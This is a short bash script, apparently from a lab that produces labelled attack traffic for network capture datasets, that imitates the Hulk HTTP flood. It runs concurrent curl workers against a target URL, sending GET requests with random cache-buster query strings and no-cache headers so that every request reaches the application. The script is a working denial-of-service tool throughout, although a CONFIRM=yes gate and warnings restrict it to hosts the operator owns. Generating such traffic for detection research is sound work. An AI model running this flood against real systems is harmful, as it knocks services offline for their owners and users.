#!/usr/bin/env bash
# lab/attacks/dos-hulk.sh — HTTP flood approximating Hulk.  Label: DoS attacks-Hulk
# Concurrent GETs with cache-buster query strings + no-cache headers (Hulk's
# signature: defeats caching so every request hits the app).
#
# !!! HIGH IMPACT — real load on a LIVE box. Short bursts only, hosts you own.
# RUN FROM THE ATTACKER HOST. Pair with:
#   sudo bash lab/capture.sh --label "DoS attacks-Hulk" --duration 45 --attacker-ip <this host>
set -euo pipefail
TARGET="${1:?usage: dos-hulk.sh <https://host> [seconds] [concurrency]}"
SECS="${2:-25}"; CONC="${3:-50}"
[ "${CONFIRM:-}" = "yes" ] || { echo "Refusing: set CONFIRM=yes (HTTP flood vs a live box)"; exit 1; }
command -v curl >/dev/null || { echo "need curl"; exit 1; }
echo "HTTP flood $TARGET for ${SECS}s x${CONC} workers ..."
end=$(( $(date +%s) + SECS ))
worker() {
  while [ "$(date +%s)" -lt "$end" ]; do
    buster=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' ')
    curl -s -o /dev/null --max-time 5 \
      -H "Cache-Control: no-cache" -H "Pragma: no-cache" \
      "$TARGET/?$buster" || true
  done
}
for _ in $(seq 1 "$CONC"); do worker & done
wait
echo "done."
